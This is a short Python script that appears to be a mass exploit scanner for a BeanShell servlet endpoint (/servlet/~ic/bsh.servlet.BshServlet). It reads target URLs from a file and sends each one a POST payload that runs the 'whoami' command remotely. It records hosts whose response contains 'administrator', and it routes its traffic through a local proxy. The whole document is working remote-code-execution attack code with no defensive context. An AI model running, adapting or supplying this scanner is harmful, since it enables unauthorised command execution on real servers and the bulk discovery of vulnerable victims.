import re
import requests

header={"User-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46"}
url=open("a.txt","r").read().splitlines()
x=open("d.txt","w+")
pload={"bsh.script":'exec("whoami")'}
proxyies = {
    'http': '127.0.0.1:10808',
    'https': '127.0.0.1:10808'
}
for i in url:
    b = i + "/servlet/~ic/bsh.servlet.BshServlet"
    y=requests.get(b,headers=header,proxies=proxyies,timeout=5)
    if y.status_code == 200:
        c=requests.post(b,headers=header,proxies=proxyies,data=pload,timeout=5)
        a=str(c.content)
        if re.search("administrator",a):
            print(i)
            x.write(i+'\n')
    else:
        print("no")
